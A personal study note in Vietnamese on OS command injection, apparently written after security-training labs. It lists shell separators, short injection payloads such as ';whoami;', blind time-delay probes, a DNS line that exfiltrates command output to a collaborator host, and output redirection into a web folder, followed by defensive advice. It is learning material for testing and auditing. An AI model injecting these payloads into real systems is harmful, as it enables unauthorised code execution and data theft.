sau khi học phần này, mình hiểu là...
OS command injection là chỗ server đem input ghép vào lệnh shell.
mình chèn meta char là chạy được lệnh khác luôn.

- separator mình hay dùng:
-> `;` chạy tiếp lệnh sau
-> `|` pipe output sang lệnh khác
-> `&` chạy background rồi chạy tiếp
-> `||` và `&&` theo điều kiện
-> newline `%0a` cũng tách được
- inline execute:
-> `` `whoami` ``
-> `$(whoami)`
- payload ngắn để test:
-> `& echo test123 &`
-> `;whoami;`
-> `|whoami`
-> `||whoami||`
- blind là loại không trả output về:
-> mình dùng time để confirm
-> `& ping -c 10 127.0.0.1 &`
-> hoặc `;sleep 10;`
-> response delay 10s => có RCE
- blind OAST:
-> `& nslookup xxxx.oastify.com &`
-> có hit về collaborator => có RCE
-> exfil thì `` `whoami`.xxxx.oastify.com ``
- blind output redirect:
-> `& whoami > /var/www/images/output.txt &`
-> sau đó GET `/images/output.txt` đọc kết quả
-> trick này biến blind thành in-band
- phòng chống:
-> tốt nhất là đừng gọi shell.
-> xài API có sẵn của ngôn ngữ.
-> nếu bắt buộc thì whitelist value.
-> check input là số hoặc chỉ alphanumeric.
-> đừng escape meta char, dễ bypass lắm.

liên quan:
- file cũ [[injection command]] có mấy ảnh excalidraw rồi
- lab mình làm:
-> [[Lab-OS command simple]]
-> [[Lab-OS command blind time]]
-> [[Lab-OS command blind output redirect]]

> [!NOTE] bài học
> sau khi quan sát mấy lab mình thấy...
> lỗi toàn do ghép string vào `sh -c`.
> nên mình khi audit cứ thấy `exec`, `system`, `popen` là soi input ngay.
> blind thì kiên nhẫn đo time + redirect file.
